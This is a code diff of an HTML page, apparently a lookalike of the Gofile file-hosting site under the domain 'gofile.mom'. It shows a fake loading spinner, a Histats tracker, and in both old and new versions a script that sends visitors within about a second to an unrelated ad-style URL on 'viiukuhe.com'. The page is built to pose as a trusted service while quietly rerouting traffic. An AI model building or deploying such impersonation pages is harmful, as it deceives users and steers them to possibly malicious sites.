@@ -1,141 +1,121 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>gofile.mom</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>gofile.mom</title>
+  <style>
+    * { box-sizing: border-box; }
 
-        body {
-            background-color: #0b0e14;
-            color: #d1d5db;
-            font-family: 'Inter', sans-serif;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-        }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #1f2a3a; /* dark blue ala gofile */
+      display: flex;
+      flex-direction: column;
+      color: #94a3b8;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
 
-        /* Navigasi */
-        .navbar {
-            display: flex;
-            justify-content: flex-start;
-            align-items: center;
-            padding: 1rem 1.5rem;
-            max-width: 80rem;
-            margin: 0 auto;
-            width: 100%;
-        }
+    /* HEADER */
+    header {
+      height: 56px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      background: #1b2533;
+    }
 
-        /* Container Utama */
-        .main-content {
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
+    .menu-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 6px;
+      background: #2563eb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        /* Spinner Gofile Asli (SVG Animation) */
-        .gofile-spinner-svg {
-            animation: rotate 2s linear infinite;
-            width: 50px;
-            height: 50px;
-        }
+    .menu-btn span,
+    .menu-btn span::before,
+    .menu-btn span::after {
+      content: '';
+      display: block;
+      width: 16px;
+      height: 2px;
+      background: #fff;
+      position: relative;
+    }
 
-        .gofile-spinner-svg circle {
-            stroke: #3b82f6;
-            stroke-linecap: round;
-            animation: dash 1.5s ease-in-out infinite;
-        }
+    .menu-btn span::before { top: -5px; position: absolute; }
+    .menu-btn span::after { top: 5px; position: absolute; }
 
-        @keyframes rotate {
-            100% {
-                transform: rotate(360deg);
-            }
-        }
+    /* MAIN */
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
 
-        @keyframes dash {
-            0% {
-                stroke-dasharray: 1, 150;
-                stroke-dashoffset: 0;
-            }
-            50% {
-                stroke-dasharray: 90, 150;
-                stroke-dashoffset: -35;
-            }
-            100% {
-                stroke-dasharray: 90, 150;
-                stroke-dashoffset: -124;
-            }
-        }
+    /* GOFILE-LIKE SPINNER */
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: 5px solid transparent;
+      border-top-color: #3b82f6;
+      border-right-color: #3b82f6;
+      animation: spin 1s linear infinite;
+    }
 
-        /* Tombol Menu Biru (Garis Tiga dibungkus Biru) */
-        .menu-btn-blue {
-            background-color: #1e88e5; /* Biru Gofile */
-            color: white;
-            padding: 0.6rem;
-            border-radius: 0.5rem;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background-color 0.2s, transform 0.1s;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-        }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-        .menu-btn-blue:hover {
-            background-color: #1976d2;
-        }
+    /* FOOTER */
+    footer {
+      padding: 20px 0 30px;
+      text-align: center;
+      font-size: 14px;
+      background: #1b2533;
+    }
 
-        .menu-btn-blue:active {
-            transform: scale(0.95);
-        }
-    </style>
+    footer a {
+      display: block;
+      color: #94a3b8;
+      text-decoration: none;
+      margin: 6px 0;
+    }
+  </style>
 </head>
 <body>
 
-    <!-- Navigasi Menu Atas -->
-    <nav class="navbar">
-        <!-- Tombol Garis Tiga dibungkus warna Biru -->
-        <div class="menu-btn-blue">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="3" y1="12" x2="21" y2="12"></line>
-                <line x1="3" y1="6" x2="21" y2="6"></line>
-                <line x1="3" y1="18" x2="21" y2="18"></line>
-            </svg>
-        </div>
-    </nav>
+  <header>
+    <div class="menu-btn"><span></span></div>
+  </header>
 
-    <!-- Area Utama -->
-    <main class="main-content">
-        <!-- Spinner Kembali ke posisi bersih (tanpa bungkus) -->
-        <svg class="gofile-spinner-svg" viewBox="0 0 50 50">
-            <circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle>
-        </svg>
-        <p class="mt-8 text-[11px] text-gray-500 font-medium uppercase tracking-[0.4em]"></p>
-    </main>
+    <main id="content">
+    <div class="spinner" id="spinner"></div>
+  </main>
 
-    <!-- Footer Sederhana -->
-    <footer class="py-6 text-center text-gray-600 text-[11px]">
-        <p>WOJTEK SAS © 2026, made with ❤️ by Gofile Team</p>
-    </footer>
+  <footer>
+    <a href="#">Home</a>
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Copyright</a>
+  </footer>
 
-    <script>
-        // Konfigurasi redirect
-        const targetUrl = "https://viiukuhe.com/dc/?blockID=419690"; 
-        const delayInSeconds = 1; 
+  <script>
+    // spinner tampil 2 detik lalu hilang
+    setTimeout(() => {
+      const spinner = document.getElementById('spinner');
+      spinner.style.opacity = '0';
+      spinner.style.transition = 'opacity 0.3s ease';
+    }, 1000);
+  </script>
 
-        window.onload = function() {
-            setTimeout(function() {
-                window.location.href = targetUrl;
-            }, delayInSeconds * 800);
-        };
-    </script>
-
-    <script>
+<script>
 /* tampilkan slug random SETELAH Histats */
 setTimeout(() => {
   const c = "abcdefghijklmnopqrstuvwxyz0123456789";
@@ -164,7 +144,15 @@ if (!sessionStorage.getItem("histats_hit")) {
     document.body.appendChild(hs);
   })();
 }
- </script>
+
+/* redirect */
+setTimeout(() => {
+  document.body.classList.add("fade-out");
+  setTimeout(() => {
+    location.href = "https://viiukuhe.com/dc/?blockID=419690";
+  }, 600);
+}, 800);
+</script>
 
 </body>
-</html>
+  </html>
